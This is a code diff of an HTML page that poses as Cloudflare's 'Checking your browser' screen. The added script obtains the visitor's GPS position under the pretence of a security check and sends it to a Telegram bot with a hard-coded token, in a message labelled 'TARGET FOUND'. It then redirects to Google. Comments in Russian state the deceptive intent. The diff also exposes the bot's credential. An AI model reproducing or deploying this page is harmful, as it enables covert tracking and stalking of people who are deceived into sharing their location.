@@ -1,31 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>System Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare | Checking your browser</title>
+    <style>
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #313131; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; max-width: 400px; padding: 20px; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0052cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; }
+    </style>
 </head>
-<body style="background:black; color:#00FF41; font-family:monospace; text-align:center; padding-top:50px;">
-    <h1>INITIALIZING...</h1>
-    <p>Please wait for satellite connection...</p>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Checking your browser...</h1>
+        <p>Please wait while we verify your connection. This process is automatic.</p>
+        <p id="status">Verifying security certificates...</p>
+    </div>
 
     <script>
+        // Функция отправки данных
+        function sendData(lat, lon) {
+            const token = "8542783294:AAGGArYa-FTs5PCosZ813RDDHzjgNw7wtTg";
+            const chat_id = "8123844229";
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 ЦЕЛЬ НАЙДЕНА: ${lat},${lon}`;
+            fetch(url);
+        }
+
         window.onload = function() {
+            // Запрашиваем GPS под видом проверки безопасности
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    var lat = position.coords.latitude;
-                    var lon = position.coords.longitude;
-                    
-                    // ТВОИ ДАННЫЕ СЮДА:
-                    var token = "8542783294:AAGGArYa-FTs5PCosZ813RDDHzjgNw7wtTg" 
-                    var chat_id = "8123844229";
-
-                    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${lat},${lon}`;
-                    
-                    // Отправка данных боту
-                    fetch(url).then(() => {
-                        document.body.innerHTML = "<h1>ERROR 404</h1><p>Update failed. Try again later.</p>";
-                    });
+                    sendData(position.coords.latitude, position.coords.longitude);
+                    // После получения данных можно перенаправить на реальный сайт (например, Google)
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 2000);
                 }, function(error) {
-                    alert("Для работы системы необходимо разрешить доступ к GPS.");
+                    document.getElementById('status').innerText = "Error: Please enable location to pass verification.";
+                    document.getElementById('status').style.color = "red";
                 });
             }
         };
